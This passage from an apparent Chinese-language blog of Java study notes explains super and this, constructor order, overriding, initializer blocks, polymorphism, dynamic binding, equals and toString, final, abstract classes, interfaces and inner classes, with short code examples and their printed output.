class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        String name=<span class="hljs-string">&quot;AA&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;A test&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    String name=<span class="hljs-string">&quot;BB&quot;</span>;<br>    String java=<span class="hljs-string">&quot;java&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> nums=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super可以访问的成员（属性和方法）</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//AA</span><br>        <span class="hljs-built_in">super</span>.test();       <span class="hljs-comment">//A test</span><br>        <span class="hljs-comment">//this可以访问的成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.nums);  <span class="hljs-comment">//100</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//BB</span><br>        <span class="hljs-comment">//this.demo();    //递归</span><br>        <span class="hljs-built_in">this</span>.test();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    String name=<span class="hljs-string">&quot;CC&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;C test&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super访问成员</span><br>        System.out.println(<span class="hljs-built_in">super</span>.java); <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//BB</span><br>        <span class="hljs-built_in">super</span>.test();  <span class="hljs-comment">//C test</span><br>        <span class="hljs-built_in">super</span>.demo();<br>        <span class="hljs-comment">//this可以访问哪些成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//CC</span><br>        <span class="hljs-built_in">this</span>.test();    <span class="hljs-comment">//C test</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="父类构造器"><a href="#父类构造器" class="headerlink" title="父类构造器"></a>父类构造器</h2><p>创建子类对象时，默认会调用父类的无参构造器 super( );</p><p>如果父类没有提供无参构造器，须在子类构造器中用 super 去知道使用父类哪个构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>(参数列表);<br>e.g.<br><span class="hljs-built_in">super</span>(name,age,sex);<br></code></pre></td></tr></table></figure><p><strong>super() 和 this() 都只能放在构造器第一行，因此不能共存在同一个构造器；</strong></p><p>3.父类构造器的调用不限于直接父类，一直往上追溯到 Object 类（顶级父类）</p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>用处</p><p>a) 子类和父类具有同名属性和方法时，<strong>默认使用子类的同名属性和方法</strong>。访问父类的属性或方法必须通过 super 来调用</p><p>b) super 代表父类对象的引用，用于访问父类对象的属性、方法、构造器</p><p>访问父类的属性（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.属性名；<br></code></pre></td></tr></table></figure><p>访问父类的方法（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.方法名（参数列表）；<br></code></pre></td></tr></table></figure><p>访问父类的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>（参数列表）；<br></code></pre></td></tr></table></figure><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>子类可以重写方法和属性</p><h2 id="方法重写特点"><a href="#方法重写特点" class="headerlink" title="方法重写特点"></a>方法重写特点</h2><ul><li><p>也称为方法覆盖</p></li><li><p>子类方法的名称、参数、与父类完全相同</p></li><li><p>返回类型和父类一样，或则是父类返回类型的子类，比如父类返回类型是 Object，子类返回方法类型是 String</p></li><li><p>子类方法不能缩小父类方法的访问权限</p></li></ul><h2 id="重载与重写的区别"><a href="#重载与重写的区别" class="headerlink" title="重载与重写的区别"></a>重载与重写的区别</h2><p><strong>重载</strong>：<strong>同一个类</strong>，方法名相同，参数类型、个数或顺序不同，与返回值和修饰符无关</p><p><strong>重写</strong>：<strong>父类和子类</strong>中，方法名、参数相同，子类返回类型与父类一样或者是其子类，子类不能缩小父类的缩小访问范围</p><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><p>可以定义多个，与静态属性初始化优先级一样，按照定义顺序执行，随着类的加载而执行，只执行一次，执行时机比普通代码块早</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcdef&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="普通代码块"><a href="#普通代码块" class="headerlink" title="普通代码块"></a>普通代码块</h2><p>可以定义多个，按照定义顺序执行，随着对象创建而执行，提高构造器代码复用性，每次创建对象都会执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//1)super()</span><br>        <span class="hljs-comment">//2)调用本类普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类什么时候被加载"><a href="#类什么时候被加载" class="headerlink" title="类什么时候被加载"></a>类什么时候被加载</h2><ul><li><p>创建对象实例</p></li><li><p>创建子对象实例，父类也会被加载</p></li><li><p>使用类的静态成员时</p></li><li><p>使用子类静态成员时，父类也会被加载</p></li></ul><h2 id="创建对象时的调用顺序"><a href="#创建对象时的调用顺序" class="headerlink" title="创建对象时的调用顺序"></a>创建对象时的调用顺序</h2><ol><li>父类的静态代码块和静态属性初始化</li><li>子类的静态代码块和静态属性初始化</li><li>父类的普通代码块和普通属性初始化</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化</li><li>子类的构造方法</li></ol><p><strong>静态代码块只能调用静态成员，普通代码块可以调用任意成员</strong></p><h2 id="执行-new-Test-会输出什么"><a href="#执行-new-Test-会输出什么" class="headerlink" title="执行 new Test();会输出什么"></a>执行 new Test();会输出什么</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>&#123;<br>    Demo(String s)&#123;<br>        System.out.println(s);<br>    &#125;<br>    Demo()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Demo无参&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>    Demo demo1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo1初始化&quot;</span>);    <span class="hljs-comment">//第三步</span><br>    <span class="hljs-keyword">static</span> Demo demo2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo2初始化&quot;</span>); <span class="hljs-comment">//第一步</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;static执行&quot;</span>); <span class="hljs-comment">//第二步</span><br>        <span class="hljs-keyword">if</span>(demo2==<span class="hljs-literal">null</span>)<br>            System.out.println(<span class="hljs-string">&quot;demo2 is null&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Test无参&quot;</span>);   <span class="hljs-comment">//最后一步</span><br>    &#125;<br>&#125;<br>输出：<br>Demo2初始化<br><span class="hljs-keyword">static</span>执行<br>Demo1初始化<br>Test无参<br></code></pre></td></tr></table></figure><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="多态参数"><a href="#多态参数" class="headerlink" title="多态参数"></a>多态参数</h2><p>参数定义成父类类型，就可以传任意子类类型进去</p><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p><strong>a）</strong> 语法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">父类类型引用名<span class="hljs-operator">=</span>new子类类型（）；<br></code></pre></td></tr></table></figure><p><strong>b）</strong> 父类引用指向子类对象</p><p><strong>c）</strong> 编译类型看左边，运行类型看右边</p><p><strong>d）</strong> 可以调用父类中所有成员（受访问修饰符影响）</p><p><strong>e）</strong>调用的时候，<strong>子类有就用子类的成员，没有就找父类（就近原则）</strong></p><p><strong>f）</strong>不能调用子类中特有成员</p><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong>a）</strong>多态的前提：<strong>连个对象（类）存在继承关系</strong></p><p><strong>b）</strong>属性的值看编译类型</p><p><strong>c）</strong>方法都看运行类型，属性看编译类型</p><p><strong>d）</strong> <strong>instanceof</strong> 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型</p><p><strong>e）</strong>要调用子类中的特有成员要向上转型</p><h2 id="多态数组"><a href="#多态数组" class="headerlink" title="多态数组"></a>多态数组</h2><p>数组类型为父类类型，保存实际元素为子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        System.out.println(b.count);<br>        b.display();<br>        A a=b;<br>        System.out.println(a==b);<br>        System.out.println(a.count);<br>        a.display();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">200</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br>输出：<br><span class="hljs-number">200</span><br><span class="hljs-number">200</span><br><span class="hljs-literal">true</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h1 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>       System.out.println(a.sum());<br>       System.out.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>   &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br>输出：<span class="hljs-number">30</span><span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>1.当调用对象方法时，该方法会和该对象内存地址&#x2F;运行类型绑定</p><p>2.当调用对象属性时，没有动态绑定机制，就近原则</p><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>Object 是所有对象的父类，也就是所有对象都可以使用 Object 里面的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">equals getClass hashCode toString<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h2><p>判断基本类型和引用类型</p><p>基本类型判断<strong>值</strong>，引用类型判断<strong>地址</strong></p><h2 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h2><p><strong>只能判断引用类型，默认判断地址是否相等</strong></p><p>子类一般会重写 equals 方法，判断内容是否相等，比如 Integer、String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Person p1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p1.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  Person p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p2.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  System.out.println(p1==p2); <span class="hljs-comment">//False</span><br>  System.out.println(p1.equals(p2));  <span class="hljs-comment">//False</span><br>  System.out.println(p1.name.equals(p2.name));    <span class="hljs-comment">//True</span><br>  System.out.println(p1.name==p2.name);   <span class="hljs-comment">//True</span><br>      <br>  String s1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  String s2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  System.out.println(s1==s2); <span class="hljs-comment">//False</span><br>  System.out.println(s1.equals(s2));  <span class="hljs-comment">//True</span><br></code></pre></td></tr></table></figure><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><h2 id="toString-方法"><a href="#toString-方法" class="headerlink" title="toString 方法"></a>toString 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    retrun <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.getName()+<span class="hljs-string">&quot;@&quot;</span>+Integer.toHexString(hashCode());<br>&#125;<br></code></pre></td></tr></table></figure><p>默认返回：全类名+@+哈希值的十六进制</p><p>子类往往重写 toString 方法，用于返回对象的属性信息</p><p>直接输出一个对象时，toString 方法会被默认调用</p><h2 id="finalize-方法"><a href="#finalize-方法" class="headerlink" title="finalize 方法"></a>finalize 方法</h2><p>子类重写该方法，释放资源</p><p>某个对象没有任何引用时，垃圾回收机制会销毁该对象，销毁前调用 finalize 方法</p><p>也可以通过 System.gc() 主动触发垃圾回收机制，但不一定马上回收</p><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>a）不希望类被继承时</p><p>b）不希望属性值被修改时（常量）</p><p>c）不希望父类的方法被子类覆盖&#x2F;重写（override）</p><p>d）不希望局部变量（参数）被修改（局部变量）</p><p><strong>final修饰实例属性，可以在定义时，构造器、普通代码块中赋值</strong></p><p><strong>final修饰静态属性，可以在定义时、静态代码块中赋初值</strong></p><h2 id="final-注意事项"><a href="#final-注意事项" class="headerlink" title="final 注意事项"></a>final 注意事项</h2><p>a）final 修饰属性必须赋值，并且不可修改</p><p>b）final 可以修饰类、属性、方法和局部变量，不能修饰构造器</p><p>c）包装类（Double、Integer、Float、Boolean ）和 String 都是 final 类</p><p>d）final 修饰类不能被继承，但能被实例化（需要不被实例化把类改成 private）</p><p>e）final 和 static 搭配使用不会加载类</p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><h2 id="abstract-只能修饰类和方法"><a href="#abstract-只能修饰类和方法" class="headerlink" title="abstract 只能修饰类和方法"></a>abstract 只能修饰类和方法</h2><p>用 abstract 关键字修饰一个类时，这个类就叫抽象类，修饰方法时就叫抽象方法</p><h2 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h2><p>抽象类可以有任意成员，可以被继承，可以没有抽象方法</p><p><strong>抽象类不能被实例化</strong></p><p>有了抽象方法，这个类必须声明为 abstract</p><p>继承了抽象类，必须实现抽象类的所有抽象方法，除非它自己也声明为 abstract 类</p><p><strong>抽象方法不能使用 private、final 和 static 修饰</strong></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口名&#123;<br><span class="hljs-comment">//属性</span><br><span class="hljs-comment">//方法</span><br>&#125;<br>class 类名 implements 接口名&#123;<br>必须实现接口的所有抽象方法<br>&#125;<br></code></pre></td></tr></table></figure><p>用来制定规则</p><h2 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>不能被实例化</li><li>接口的修饰只能是 public 和默认，这点和类的修饰符是一样的</li><li>不能继承其他的类，但可以继承多个别的接口</li><li>接口中的方法都是 public 方法，抽象方法可以不用 abstract 修饰，public abstract 可以省略</li><li>一个普通类实现接口就必须将该接口的所有方法实现</li><li>抽象类实现接口，可以不用实现接口的方法</li><li>一个类同时可以实现多个接口</li><li>接口中的属性都是 <strong>public static final</strong> 修饰符</li></ul><p>​访问形式：<strong>接口名. 属性名</strong></p><h2 id="接口的多态特性"><a href="#接口的多态特性" class="headerlink" title="接口的多态特性"></a>接口的多态特性</h2><p>多态参数、向上转型、多态数组</p><h2 id="接口的多态传递"><a href="#接口的多态传递" class="headerlink" title="接口的多态传递"></a>接口的多态传递</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">A</span>&#123;&#125;<br>B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br></code></pre></td></tr></table></figure><h2 id="接口、继承"><a href="#接口、继承" class="headerlink" title="接口、继承"></a>接口、继承</h2><p>继承：提高代码复用性和可维护性</p><p>接口：设计好各种方法，让其他类去实现</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AA</span>&#123;<span class="hljs-type">int</span> a=<span class="hljs-number">23</span>;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><br>main函数中：<br> BB b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>    System.out.println(b.a);<br>    System.out.println(AA.a);<br>    System.out.println(BB.a);<br></code></pre></td></tr></table></figure><h1 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>定义在外部类的成员位置上</p><p>a）成员内部类（无 static 修饰）</p><p>b）静态内部类（使用 static 修饰）</p><p>定义在外部类的局部位置上（比如方法类）：</p><p>a）局部内部类（有类名）</p><p>b）匿名内部类（没有类名）</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的成员位置上，没有 static 修饰</p><h2 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类的所有成员，包含私有的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;butterfly&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> sex=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;OuterClass static block&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OuterClass</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClass</span>&#123;<br>        <span class="hljs-keyword">public</span> String language=<span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">abc</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(name);<br>            System.out.println(age);<br>            System.out.println(sex);<br>            test();<br>        &#125;<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;InnerClass block&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">InnerClass</span><span class="hljs-params">(String language)</span>&#123;<br>            <span class="hljs-built_in">this</span>.language=language;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以添加任意访问修饰符去修饰成员内部类，因为相当于一个成员</li><li>成员内部类不能定义静态成员</li><li>作用域与其他成员一样</li><li>外部类可以访问成员内部类</li><li>外部其他类可以访问成员内部类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()..<span class="hljs-keyword">new</span> <span class="hljs-title 